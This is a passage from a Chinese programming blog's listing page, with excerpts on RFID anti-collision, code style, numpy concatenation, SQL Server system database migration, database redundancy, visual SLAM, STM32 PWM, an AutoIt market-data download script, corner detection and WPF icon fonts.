DSP主程序通过串口和上位机通信，接收并解析上位机指令，编码后发送给射频发射电路。从射频接收电路输出的I、Q两路信号，经A/D模块采样后，合成一路信号。主程序对此信号进行同步、FM0解码、CRC校验，得到最终数据，并将正确的数据上传到上位机中。如果FM0解码错误或CRC校验错误，则进行防碰撞处理。
防碰撞机制分析与实现
ISO 18000-6B协议中使用的是一种类二进制树形的防碰撞算法，通过标签内随机产生0、1及内置计数器实现标签的防碰撞。
标签在工作过程中共有“掉电”、“准备”、“识别”和“数据交互”4个状态，其状态转换如图6-23 所示。 标签进入读写器的工作范围时，从离场“掉电”状态进入“准备”状态。读写器通过选择指令让处于“准备”状态的所有或部分标签进入“识别”状态。
当进入“识别”状态的标签多于一张时，就要通过碰撞仲裁实现标签的有效识别
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a8c00ab0e65264ad7ea7e99f8c6e0f47/" rel="bookmark">
			编写优雅代码的最佳实践
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Robert Martin曾说过"在代码阅读中说脏话的频率是衡量代码质量额唯一标准"。同时，代码的写法应当使别人理解它所需的时间最小化，也就是说我们写的代码是给人看的而不是给机器看的。那么，如何编写优雅代码呢？可以从思想层面和具体技巧层面来优化代码，思想层面指的是遵循面向对象设计原则，本期介绍的是具体技巧。
##1. 代码总是越短越好吗？
assert((!(bucket = findBucket(key))) || !bucket.isOccupied()); 复制代码 上面这行代码虽然比较短，但是难以阅读。为了更好地阅读，我们做如下修改：
bucket = findBucket(key); if(bucket != null){ assert(!bucket.isOccupied()); } 复制代码 减少代码行数是一个好目标，但是让阅读代码的事件最小化是个更好的目标。
2. 给重要语句添加注释 // Fast version of "hash = (65599*hash) + c" hash = (hash &lt;&lt; 6) + (hash &lt;&lt; 16) - hash + c 复制代码 上面这行代码如果没有添加注释，我们根本不知道是什么意思，但是有了这行注释，我们就知道通过移位操作来提升性能。
## 3. tmp的使用 tmp是我们经常用的，譬如说两个变量置换，都已变成约定俗成了。
tmp = right; right = left; left = tmp; 复制代码 String tmp = user.getName(); tmp += " " + user.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a8c00ab0e65264ad7ea7e99f8c6e0f47/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/497ad41651c10f7843cc279e0809e92f/" rel="bookmark">
			np.c_和np.r_的用法解析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		np.r_是按列连接两个矩阵，就是把两矩阵上下相加，要求列数相等。 np.c_是按行连接两个矩阵，就是把两矩阵左右相加，要求行数相等。 具体见示例： 1.np.c_的用法
a = np.array([[1, 2, 3],[7,8,9]]) b=np.array([[4,5,6],[1,2,3]]) a Out[4]: array([[1, 2, 3], [7, 8, 9]]) b Out[5]: array([[4, 5, 6], [1, 2, 3]]) c=np.c_[a,b] c Out[7]: array([[1, 2, 3, 4, 5, 6], [7, 8, 9, 1, 2, 3]]) d= np.array([7,8,9]) e=np.array([1, 2, 3]) f=np.c_[d,e] f Out[12]: array([[7, 1], [8, 2], [9, 3]]) 2.np.r_的用法 a = np.array([[1, 2, 3],[7,8,9]]) b=np.array([[4,5,6],[1,2,3]]) d= np.array([7,8,9]) e=np.array([1, 2, 3]) g=np.r_[a,b] g Out[14]: array([[1, 2, 3], [7, 8, 9], [4, 5, 6], [1, 2, 3]]) h=np.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/497ad41651c10f7843cc279e0809e92f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a265858f8df276221890bd3125235955/" rel="bookmark">
			SQL Server系统数据库迁移
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		标签：
分类：SQLServer数据库迁移 一、迁移的意义：
1，一般就是从C盘移动其他分区；
2，从这个硬盘移动其他硬盘，数据库还是正常启动；
3，为一般的数据库迁移做准备；
二、系统数据库迁移主要迁移的数据库
第一类：tempdb,model,msdb
第二类：master,（resource可选）
三、迁移步骤：
1，master数据库
一般默认SQlServer数据库安装完成后，SQLServer的4个系统数据库（master、model、msdb、tempdb）都会被自动安装在安装路径下，也就是系统盘的ProgramFIles文件夹下。所带来的问题就是绝大多数数据库服务器为了同时照顾到性能，成本和高可用性着三个方面，都会将数据库安装在同一个磁盘（raid1）上，通常这个磁盘（Raid1）还不一定会用上15k的SAS，有的只用了10k的SAS，更有甚者，为了成本，装2个7.2k的sata也就完事，再加上Raid1阵列本身就是一种读取性能非常强，但是写入性能相当差的阵列形式。所以对于系统数据库，尤其对tempdb数据库来说是非常不利的，就肯定会对整个SQLServer的性能造成影响。
所以，将整个系统数据库迁移到性能更加高的阵列上，是一个解决硬件性能瓶颈的基础解决方案。
具体介绍一下如何将系统数据库迁移到其他分区上（以sql2008 R2为例）：
1，首先迁移master数据库，而且master数据库也是整个SQLServer数据库实例的核心，所有的设置都存放在master数据库，如果master数据库出现问题，整个实例都将瘫痪。
首先打开SQLServerConfiguration Manager,在左边列表框中选中SQLServerSerrvices节点，然后在左边的列表框找到要迁移的系统数据库的实例的那个SQL Server服务，比如SQLServer（MSSQLSERVER），停止这个实例的服务，然后单击选中最底下的“属性”，并且切换到“方面”标签，如图：
看到“Startup Parameters”，这里的参数就是需要我们修改的，如图：
文字整理：
-dC:\Program Files\Microsoft
SQLServer\MSSQL10.MSSQLSERVER\MSSQL\DATA\master.mdf;
-eC:\Program Files\Microsoft SQL
Server\MSSQL10.MSSQLSERVER\MSSQL\Log\ERRORLOG;
-lC:\Program Files\Microsoft
SQLServer\MSSQL10.MSSQLSERVER\MSSQL\DATA\mastlog.ldf
“-d”后面的就是master数据库文件的位置，“-e”是该SQLServer实例的错误日志所在位置，至于“-l”
就是master数据库日志文件所在的位置。
修改数据文件和日志文件的路径适当位置，错误日志的位置一般需要做变更，例如：将数据库文件存放到D盘的SQLData文件夹下，日志文件存放到E盘的SQLLog文件夹下，则参数如下：
-dD:\SQLData\master.mdf;-eC:\Program Files\Microsoft
SQLServer\MSSQL10.MSSQLSERVER\MSSQL\Log\ERRORLOG;-lE:\SQLLog\mastlog.ldf
点击 “OK”保存并关闭对话框。
然后需要做的是将master数据库的数据库文件和日志文件剪贴到刚刚“startup parameters”定义的路径中， 接着启动该服务实例的服务。
注意：
此时可能仍然会有出现SQL Server服务无法启动的情况，确保刚刚配置准确无误，然后就是NTFS权限的事情了，如果你不是用LocalSystem来启动SQLServer服务，那么更改完存放路径后，你需要给新的盘符或文件夹相应的权限，这样服务才能启动，建议直接给相应账号“FullControl”的权限，至于为什么，那是经验，原因得要问Microsoft了。 master数据库就算迁移完成。
对于tempdb、msdb和model数据库
1、修改文件路径
--Move tempdb ALTER DATABASE tempdbMODIFY
FILE(NAME='tempdev',FILENAME='D:\Database\tempdb.mdf'); ALTER DATABASE tempdbMODIFY
FILE(NAME='templog',FILENAME='D:\Database\templog.ldf'); --Move model ALTER DATABASE modelMODIFY
FILE(NAME='modeldev',FILENAME='D:\Database\model.mdf'); ALTER DATABASE modelMODIFY
FILE(NAME='modellog',FILENAME='D:\Database\modellog.ldf'); --Move msdb ALTER DATABASE msdbMODIFY FILE(NAME='MSDBData',FILENAME='D:\Database\msdbdata.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a265858f8df276221890bd3125235955/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8cecf9d2b42f0eaa67437b4608c99fa0/" rel="bookmark">
			表设计中冗余字段的思考
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		世界上最遥远的距离不是我不能说我爱你，而是想你痛彻心扉却只能深埋心底。——《我在未来等你》
1、引言 第三范式（3NF）是第二范式（2NF）的一个子集，即满足第三范式（3NF）必须满足第二范式（2NF）。简而言之，第三范式（3NF）要求一个关系中不包含已在其它关系已包含的非主关键字信息。例如，存在一个部门信息表，其中每个部门有部门编号（dept_id）、部门名称、部门简介等信息。那么在员工信息表中列出部门编号后就不能再将部门名称、部门简介等与部门有关的信息再加入员工信息表中。如果不存在部门信息表，则根据第三范式（3NF）也应该构建它，否则就会有大量的数据冗余。简而言之，第三范式就是属性不依赖于其它非主属性，也就是在满足2NF的基础上，任何非主属性不得传递依赖于主属性。
根据数据库设计的第三方式，在数据库设计过程中，应该尽量消除冗余。即设计数据库时，某一个字段属于一张表，但它同时出现在另一个或多个表，且完全等同于它在其本来所属表的意义表示，那么这个字段就是一个冗余字段。
随着企业数据量与并发量不断的增加，冗余字段的存在到底是好还是坏呢？
根据第三范式而言，冗余字段是垃圾的数据库设计。
2、举例说明与研究 所有问题出现必然因为场景问题，针对冗余字段问题，分为两个场景：
（1）快照场景（副本场景）：交易场景大部分是数据快照，而不是冗余，用户下单时候的用户名、地址、商品名称、商品描述等，若采用关联，商品在下单后发生了更新的话再去关联查询就会导致和用户操作时的数据不一致，从而产生纠纷。
（2）冗余场景：一般数据改动的可能性少，而查询多的场景会使用冗余，例如淘宝的店铺名称，淘宝商家中心会有这个字段，可能里面的商家论坛也有，再假设聚划算这种独立的大业务自己也存一份，再来个垂直频道电器城的后台管理也独立存一份，这种场景是由于对查询性能要求高产生的，所以必须要冗余，在业务的取舍上，肯定是对让用户更快看到信息，那么不可避免的是带来维护成本的增加，对于数据一致性问题，只要做到最终一致就可以了，分布式的CAP原则的实际应用基本都是通过牺牲数据一致性(C)来保证高可用(A)和高可靠(P)， 因为这种场景大部分都是可以接受短暂的数据不一致的，对业务的影响及其微小。
又比如，”用户昵称”字段”nickname”本来属于表”user”，那么，表示”用户昵称”的字段就唯一的只应该属于”user”表的”nickname”字段，这样，当用户要修改昵称的时候，程序就只需要修改 user.nickname这个字段就行了。不过问题也随之而来，我在其他数据表(如订单orders表)里只存储了用户的ID，我要通过这个ID值得到用户昵称该怎么办呢？一个普遍的解决方法是通过联接(join)，在查询时，通过id这个唯一条件联接两个表，从而取到用户的昵称。
这样确实是没问题，我也一直觉得这样是最好的方案，扩展方便，当要更新用户信息时，程序中要修改的地方很少，但是随着数据库里数据不断增加，百万，千万，同时，用户表的数据肯定也在不断的增加的，它可能是十万，百万。这个时候，你会发现两个表通过联接来取数据就显得相当费力了，可能你只需要取一个nickname这个用户昵称属性，你就不得不去联一下那个已经几十万的用户表进行检索，其速度可想而知了。
这个时候，你可以尝试把nickname这个字段加到orders这个订单表中，这样做的好事是，当你要通过订单表呈现一个订单列表时，涉及用户的部分可能就不需要再进行联接查询了。当然，有利就有弊，这样做的弊端就是，当你尝试更新用户信息时，你必须记得用户信息表里当前被更新的字段中，有哪些是冗余字段，分别属于哪些表，找到他们，然后加入到你的更新程序段中来。这个是程序中的开销，开销在开发人员的时间上了。至于这样做是否值得，就得看具体情况而定了。
所以，目前要创建一个关系型数据库设计，我们有两种选择：
1，尽量遵循范式理论的规约，尽可能少的冗余字段，让数据库设计看起来精致、优雅、让人心醉。
2，合理的加入冗余字段这个润滑剂，减少join，让数据库执行性能更高更快。
选择哪一种呢？如果你是一个美学狂人，并且财大气粗，非要使用第一种方案，也没关系，这种方案的短板并非不可救药的。比如，你可以增加服务器，从数据库集群入手，进行读写分离，读的时候可以将压力分散到不同的数据库服务器上，这样也可以获得很好的性能，只是多付出了硬件成本和维护成本。或者，你可以在数据库前端架设Memcached之类的缓存服务，减少读写数据库的次数，也可以达到同样的效果。问题在于你确定你需要缓存之类的东西。
如果做不到上面的只能选择第二种了，当涉及到修改的时候就需要将所有相关的数据进行修改了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9996fbf2d41dadf6b6609adb3054c04b/" rel="bookmark">
			关于视觉SLAM的一些常识（纯小白学习笔记）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 本文只是小白对于视觉slam的一个非常泛的介绍，对于视觉slam中的数学运算均没有提及，适合于对没有接触过视觉slam的新人进行一个简单的科普。作者即小白，文章如有错误，非常非常非常欢迎指正！（重要的事说三遍）
注：文中相机模型图片借用了高翔博士的ppt内容
视觉slam从根本上其实就是为了回答两个问题，机器人在哪，机器人所处的环境是什么样的。这其实和人进入一个陌生的环境时所思考的问题非常相似。比如我们被拉进了一个陌生的屋子，我们会首先观察这个屋子，观察我们处在一个什么样的环境之中，接下来我们就会思考我们这是在哪。机器人同样如此，我们是通过眼睛、大脑来完成，而机器人就是利用摄像头和处理器来实现。 视觉SLAM分为三大主要模块：前端的视觉里程计，后端优化，回环检测。做完这些，就可以进行建图的工作了，也就是我们常说的三维点云图。前端视觉里程计的作用，简而言之，第一是要根据摄像头回传的图像计算相机的帧间运动，第二就是估计路标点大致的空间位置坐标。后端优化的作用就是根据前端在不同时刻计算的相机位姿计算最大后验概率估计，可以起到状态预测的作用。回环检测的作用显而易见，当摄像头在环境中到达了自己曾经先前到达过的位置后，因为传感器和计算过程存在误差，所以通常建立出的点云图都不能做到曲线闭合。回环检测的功能便是判断相机是否回到过先前位置，从而修正误差，保证点云图与实际空间的理想。 从前端视觉里程计讲起。 图像用什么摄像头获取？ 1.单目相机 优点：便宜啊 缺点：初始化非常不精确，容易Tracking Lost; 存在尺度不确定的问题，比如丢失深度信息的相片中，我们能见到“手捏太阳”“借位拍照”这样的现象。 2.双目相机 优点：被动测量深度，即可以通过计算获得物体的深度（距离相机的前后距离） 缺点：计算量大，在特征少的白墙、沙漠等环境很容易Tracking Lost。 3.RGB-D相机 优点：利用传感器主动测量深度，TOF相机更是被称为相机的未来。建图准确，不易Tracking Lost 缺点：受阳光，墙面反光等影响 相机的帧间运动用什么描述？ 1.旋转矩阵、平移矢量 2.四元数 3.欧拉角 这些都是描述刚体在三维空间中运动的方式，具体有什么运算规则或者几何意义，这篇就不详细讲了，我这个小白也讲不清楚，毕竟自己都不太明白2333 怎么通过图像计算帧间运动？ 1.相机模型：针孔相机模型 2.视觉里程计中最基本的问题就是给定两个已经成功匹配的空间点在相机平面内投影的坐标，如何计算相机在这两个观察点之间的运动状态。 怎么进行点的匹配？ 每帧图像包含的信息：关键点、描述子。关键点是图像信息最集中的部分。描述子是用于区别每个特征点的信息，用于不同帧图像间同一对特征点的匹配。 特征点匹配算法：ORB、SIFT、SURF 等。 怎么计算两点间的运动状态？ 1）计算方法：对极几何方法、PnP方法、ICP方法。 对极几何方法：知道两组像素的位置，估计相机运动状态。 每两个成功匹配的点可以 提供一对对极约束，提供八个点就可以计算出本质矩阵（八点法），对本质矩阵进行SVD分解就可以解出相机运动的旋转矩阵R和平移矢量t。 PnP方法：知道一组匹配点的空间位置和在相机平面的投影位置，估计相机运动状态。 ICP方法：知道两组点的空间位置，估计相机运动状态。 2）优化方法：BA优化。BA优化是利用迭代法（牛顿迭代、列文伯格-马克尔特迭代法等）对R,t的值进行多次迭代使得误差值最小化。 后端优化部分（多为一些比较成熟的算法） 主要方法： 1、基于滤波器 ：KF、EKF 2、基于非线性优化：图优化、因子图 EKF：将系统线性化，用高斯分布近似观测噪声，并利用卡尔曼滤波进行状态更新。 图优化：给定初值后不断迭代更新图，主要利用的是g2o库 回环检测部分 作用：当相机在空间中运动的时候，很有可能出现相机所在的点在之前到达过的情况。此时三维重建的点云图上，相机的运动轨迹应该是闭合的曲线。但是由于传感器存在误差，计算过程也有很大的误差，所以点云图上，相机的轨迹通常不闭合。词袋检测可以判断相机是否在曾经到达过当前点，如果到达过，则让点云图轨迹闭合。 实现方法：创建词袋，可以理解为一个袋子，这个袋子里装着每一帧图像中的特征元素。利用词袋比较每两帧图像的相似度，当相似度大于某一个阈值的时候，就认为这两幅图像是在同一点观测到的，相机回到了曾经到达过的位置。 视觉slam大概简介就这些，最近刚看完了lsdslam和orbslam的源码，有很多不懂的地方，等搞懂了里面的数学运算再写一写。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0be413b172e5873e0242843be75173f2/" rel="bookmark">
			中文汉字识别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在用了一段时间的torch之后，发现在cpu上运行代码有很多问题，所以就放弃了torch，转战pytorch。
这里是github上的一个链接。https://github.com/chineseocr/chinese-ocr
这个代码是可以成功运行的，主要是tensorflow+pytorch
安装环境可能会有很多问题，这里建议用anacoda来安装环境
1.安装anacoda
https://www.anaconda.com/download/#linux
在官网上下载所需要的版本。根据提示按部就班的完成安装。
可参考这篇博文
https://blog.csdn.net/zhdgk19871218/article/details/46502637
Anaconda创建环境：
conda create -n 名字
删除环境
conda remove -n 名字
激活环境
source activate 名字
退出环境
source deactivate
2.根据github上的提示安装cpu环境
setup-cpu.sh
（如果是要用gpu版本自己看另外一个文件)
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aadbc28249b773511adf307228294ac7/" rel="bookmark">
			【STM32】通用定时器的PWM输出（实例：PWM输出）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		STM32F1xx官方资料：
《STM32中文参考手册V10》-第14章 通用定时器
通用定时器PWM概述 STM32定时器输出通道引脚 这里以TIM3为例来讲解。STM32的通用定时器分为TIM2、TIM3、TIM4、TIM5，而每个定时器都有独立的4个通道可以用来作为：输入捕获、输出比较、PWM输出、单脉冲模式输出等。
STM32的定时器除了TIM6和TIM7（基本定时器）之外，其他的定时器都可以产生PWM输出。其中，高级定时器TIM1、TIM8可以同时产生7路PWM输出，而通用定时器可以同时产生4路PWM输出，这样STM32最多可以同时产生30路PWM输出！
从图中的内容可以看出，TIM3的4个通道相对应的各个引脚以及重映射情况下的各个引脚的位置。
PWM的工作原理 在通用定时器框图中，主要涉及到最顶上的一部分（计数时钟的选择）、中间部分（时基单元）、右下部分（PWM输出）这三个部分。这里主要讲解一下右下部分（PWM输出），其他两个部分可以参考文章：【STM32】通用定时器的基本原理（实例：定时器中断）。
下面以向上计数为例，简单地讲述一下PWM的工作原理：
在PWM输出模式下，除了CNT（计数器当前值）、ARR（自动重装载值）之外，还多了一个值CCRx（捕获/比较寄存器值）。当CNT小于CCRx时，TIMx_CHx通道输出低电平；当CNT等于或大于CCRx时，TIMx_CHx通道输出高电平。 这个时候就可以对其下一个准确的定义了：所谓脉冲宽度调制模式（PWM模式），就是可以产生一个由TIMx_ARR寄存器确定频率，由TIMx_CCRx寄存器确定占空比的信号。它是利用微处理器的数字输出来对模拟电路进行控制的一种非常有效的技术。
PWM的通道概览 每一个捕获/比较通道都是围绕着一个捕获/比较寄存器（包含影子寄存器），包括捕获的输入部分（数字滤波、多路复用和预分频器），和输出部分（比较器和输出控制）。
捕获/比较模块由一个预装载寄存器和一个影子寄存器组成。读写过程仅操作预装载寄存器。
在捕获模式下，捕获发生在影子寄存器上，然后再复制到预装载寄存器中。 在比较模式下，预装载寄存器的内容被复制到影子寄存器中，然后影子寄存器的内容和计数器进行比较。 CCR1寄存器：捕获/比较值寄存器：设置比较值；CCMR1寄存器：OC1M[2:0]位：对于PWM方式下，用于设置PWM模式1或者PWM模式2；CCER寄存器：CC1P位：输入/捕获1输出极性。0：高电平有效，1：低电平有效。CCER寄存器：CC1E位：输入/捕获1输出使能。0：关闭，1：打开。 PWM输出的模式区别 通过设置寄存器TIMx_CCMR1的OC1M[2:0]位来确定PWM的输出模式：
PWM模式1：在向上计数时，一旦TIMx_CNT&lt;TIMx_CCR1时通道1为有效电平，否则为无效电平；在向下计数时，一旦TIMx_CNT&gt;TIMx_CCR1时通道1为无效电平(OC1REF=0)，否则为有效电平(OC1REF=1)。PWM模式2：在向上计数时，一旦TIMx_CNT&lt;TIMx_CCR1时通道1为无效电平，否则为有效电平；在向下计数时，一旦TIMx_CNT&gt;TIMx_CCR1时通道1为有效电平，否则为无效电平。 注意：PWM的模式只是区别什么时候是有效电平，但并没有确定是高电平有效还是低电平有效。这需要结合CCER寄存器的CCxP位的值来确定。
例如：若PWM模式1，且CCER寄存器的CCxP位为0，则当TIMx_CNT&lt;TIMx_CCR1时，输出高电平；同样的，若PWM模式1，且CCER寄存器的CCxP位为2，则当TIMx_CNT&lt;TIMx_CCR1时，输出低电平。
PWM的计数模式 向上计数模式
下面是一个PWM模式1的例子。当TIMx_CNT&lt;TIMx_CCRx时PWM信号参考OCxREF为高，否则为低。如果TIMx_CCRx中的比较值大于自动重装载值(TIMx_ARR)，则OCxREF保持为’1’。如果比较值为0，则OCxREF保持为’0’。
向下计数模式
在PWM模式1，当TIMx_CNT&gt;TIMx_CCRx时参考信号OCxREF为低，否则为高。如果TIMx_CCRx中的比较值大于TIMx_ARR中的自动重装载值，则OCxREF保持为’1’。该模式下不能产生0％的PWM波形。
中央对齐模式
当TIMx_CR1寄存器中的CMS位不为’00’时，为中央对齐模式(所有其他的配置对OCxREF/OCx信号都有相同的作用)。根据不同的CMS位设置，比较标志可以在计数器向上计数时被置’1’、在计数器向下计数时被置’1’、或在计数器向上和向下计数时被置’1’。TIMx_CR1寄存器中的计数方向位(DIR)由硬件更新，不要用软件修改它。
自动加载的预加载寄存器 在TIMx_CCMRx寄存器中的OCxM位写入’110’（PWM模式1）或’111’（PWM模式2），能够独立地设置每个OCx输出通道产生一路PWM。必须设置TIMx_CCMRx寄存器OCxPE位以使能相应的预装载寄存器，最后还要设置TIMx_CR1寄存器的ARPE位，（在向上计数或中心对称模式中）使能自动重装载的预装载寄存器。
在TIMx_CRx寄存器的ARPE位，决定着是否使能自动重装载的预加载寄存器。
根据TIMx_CR1位的APRE位的设置，APRE=0时，预装载寄存器的内容就可以随时传送到影子寄存器，此时两者是互通的；APRE=1时，在每一次更新事件时，才将预装在寄存器的内容传送至影子寄存器。
简单的说：ARPE=1，ARR立即生效；APRE=0，ARR下个比较周期生效。
PWM相关配置寄存器 捕获/比较模式寄存器1（TIMx_CCMR1） 捕获/比较模式寄存器总共2个，TIMx_CCMR1和TIMx_CCMR2。TIMx_CCMR1控制CH1和CH2，TIMx_CCMR2控制CH3和CH4。该寄存器的某些位在不同模式下功能不一样，上面一层对应输出而下面一层对应输入。
其中模式设置位OCxM位，此位由3位组成，一共可以配置成7种模式，我们使用的是PWM模式，所以这三位必须为110/111。
作用：在PWM输出模式下，确定PWM的模式、使能相应的预装载寄存器等操作。
捕获/比较使能寄存器（TIMx_CCER） 作用：在PWM输出模式下，确定PWM的输出极性和输出使能。
捕获/比较寄存器1（TIMx_CCR1） 作用：在PWM输出模式下，确定比较的值。
PWM相关配置库函数 1个输出初始化函数 void TIM_OC1Init(TIM_TypeDef* TIMx, TIM_OCInitTypeDef* TIM_OCInitStruct); void TIM_OC2Init(TIM_TypeDef* TIMx, TIM_OCInitTypeDef* TIM_OCInitStruct); void TIM_OC3Init(TIM_TypeDef* TIMx, TIM_OCInitTypeDef* TIM_OCInitStruct); void TIM_OC4Init(TIM_TypeDef* TIMx, TIM_OCInitTypeDef* TIM_OCInitStruct); 作用：在四个通道中选择一个，初始化PWM输出模式、比较输出极性、比较输出使能、比较值CCRx的值。
1个参数设置函数 void TIM_SetCompare1(TIM_TypeDef* TIMx, uint16_t Compare1); void TIM_SetCompare2(TIM_TypeDef* TIMx, uint16_t Compare2); void TIM_SetCompare3(TIM_TypeDef* TIMx, uint16_t Compare3); void TIM_SetCompare4(TIM_TypeDef* TIMx, uint16_t Compare4); 作用：在四个通道中选择一个，设置比较值。通常在初始化函数中已经设置了比较值，此函数用于除初始化之外的修改。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aadbc28249b773511adf307228294ac7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6d9415b6dbae0fb26f84c8c3beabe336/" rel="bookmark">
			python count（）函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Python 元组 count() 方法用于统计某个元素在元祖,列表，字符串中出现的次数。可选参数为在字符串搜索的开始与结束位置。
参数 sub -- 搜索的子字符串start -- 字符串开始搜索的位置。默认为第一个字符,第一个字符索引值为0。end -- 字符串中结束搜索的位置。字符中第一个字符的索引为 0。默认为字符串的最后一个位置。 例子：
字符串：
a="hello world"
print (a.count("e",1,10)
print (a.count("e")
返回：
》》》1
转载于:https://www.cnblogs.com/star12111/p/8881586.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ddf29dae1edc5e1abfa3f2d8c8bbc618/" rel="bookmark">
			安信安睿终端V7.11自动下载日线与1分钟5分钟K线脚本
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		下载安装autoit脚本中替换通达信路径 ，运行命 "C:\Program Files (x86)\AutoIt3\autoit3.exe" /ErrorStdOut "D:\run_tdx.au3" ，可以用schedule程序自动调用。淘宝上通达信脚本居然卖近300块，真无耻，这绝本不难写，不过我这两三天都一点时间抽出时间调试，今晚终于成功。家中电脑win10上成功，办公室win7弹出窗口后还需随便点一下才行。
;#RequireAdmin,这会导致阻塞模式没了
; 在云服务器上运行时，远程桌面关闭会导致autoit3的鼠标和键盘操作失效，请改用RealVNC
#Include &lt;GuiTab.au3&gt;
#include &lt;GuiButton.au3&gt;
Func RunMain()
; 请配置通达信软件的主程序
Local $iPID = Run("D:\axzq_v6\TdxW.exe", "")
; 请配置通达信软件的标题
Local $title = "[TITLE:安信安睿终端V7.11; CLASS:#32770]"
WinActivate($title)
Local $hLoginWnd = WinWaitActive($title)
; 开始下载数据
Sleep(500)
ControlClick($hLoginWnd, "", "[CLASS:AfxWnd42; INSTANCE:12]")
EndFunc
Func PopDownloadDlg()
; 找到主窗口，并弹出下载对话框
Local $title = "[CLASS:TdxW_MainFrame_Class]"
WinActivate($title)
Local $hMainWnd = WinWaitActive($title)
SendKeepActive($hMainWnd)
WinMove($hMainWnd, "", 0, 0, 300, 600)
;在本地居然不能用，不然会出错
;Sleep(2000)
;WinClose("[TITLE:即时播报; CLASS:#32770]")
; 点击到盘后数据下载
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ddf29dae1edc5e1abfa3f2d8c8bbc618/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8c6adc2d36abaa0c3d95a6315fc550cf/" rel="bookmark">
			图像拐点检测-原理以及代码实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天带来的内容只用两个字形容-干货！！首先我们科普下图像识别的常识，图片在电脑看来，其实就是一个矩阵，每个矩阵中的一个值都对应图片的一个像素点。（下图摘自《机器学习实践应用》）
图片中其实是有很多的边以及拐角的，今天要介绍的就是如何通过算法找到图片拐角。 原理
其实找到拐角，很简单，就是在图片矩阵中，通过一个移动的窗口去遍历矩阵中的数值，一旦返现有像素变化明显的地方，那就可能是一个拐点。这个过程就有点像“拿澡巾闭着眼睛从上向下搓澡，当你搓到一个硬硬的东西的时候，你会感觉这个部位跟其它的地方不同，没错，这里就是你的膝盖。” 还是正经一点，看一下数学公式，(x,y)可以理解成是一张图片的横纵坐标，就是人的身体。(u,v)就是窗口函数，就是移动的澡巾。找图片的拐点就跟搓澡去找身体坚硬的地方一样，需要不断游动(u,v)的值，当这个值剧烈变化了，就说明出现了拐点。
最终通过数学方法，可以简化上边的函数式，过程很复杂，大家会意下就好，最终的结果：
R是这样判断的，R=MIN（x',y'），x'表示图片横向的变化趋势，y‘表示图片纵向的变化趋势，这个可以用一张图解释下，
（1）下图左数第一张是y’向变化很小，而x‘向变化大，可以设定为x'&gt;0，y'&lt;0，于是R&lt;0。
（2）中间的一张两个方向都不变，R=0
（3）最右边一张两个方向变化都很大，x'&gt;0，y'&gt;0，R&gt;0
于是，最右边的图是拐角，最左边的是边，中间的什么都不是。
代码
下面就用一段OPENCV的代码实现一下拐点检测，可以通过红点把拐角的地方标出来，给大家一个直观印象。
import numpy as np import cv2 from matplotlib import pyplot as plt img = cv2.imread('sample.jpg') gray = cv2.cvtColor(img,cv2.COLOR_BGR2GRAY) corners = cv2.goodFeaturesToTrack(gray,25,0.01,10) corners = np.int0(corners) for i in corners: x,y = i.ravel() cv2.circle(img,(x,y),3,255,-1) plt.imshow(img),plt.show() 再跑一个case给大家看看，身边没有拐角特别明显的东西，随手弄了张感觉比较明显的拐角图，恩！
原图：
运行结果：
今天代码写的我快缺氧了，欢迎猛烈转载，良心制作，谢谢！
参考：
https://blog.csdn.net/woxincd/article/details/60754658
https://blog.csdn.net/qq_41352018/article/details/79944481
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/183e26e3df8835a3c29750ed5fb23588/" rel="bookmark">
			WPF 使用Font Awesome
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.下载Font Awesome： https://fontawesome.com/ 2.WPF中应有字体文件，创建 &lt;Style x:Key="FontAwesome"&gt; &lt;Setter Property="TextElement.FontFamily" Value="pack://application:,,,/fonts/#FontAwesome" /&gt; &lt;/Style&gt;
3.通过字体图片映射表将字体图片绑定到对应的控件，映射表地址：https://fontawesome.com/cheatsheet#use
&lt;TextBlock Text="&amp;#xf004;" FontFamily="{StaticResource FontAwesome}"&gt;&lt;/TextBlock&gt;
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b8d64f8d5afe03e2d5446e8f3595fe9b/" rel="bookmark">
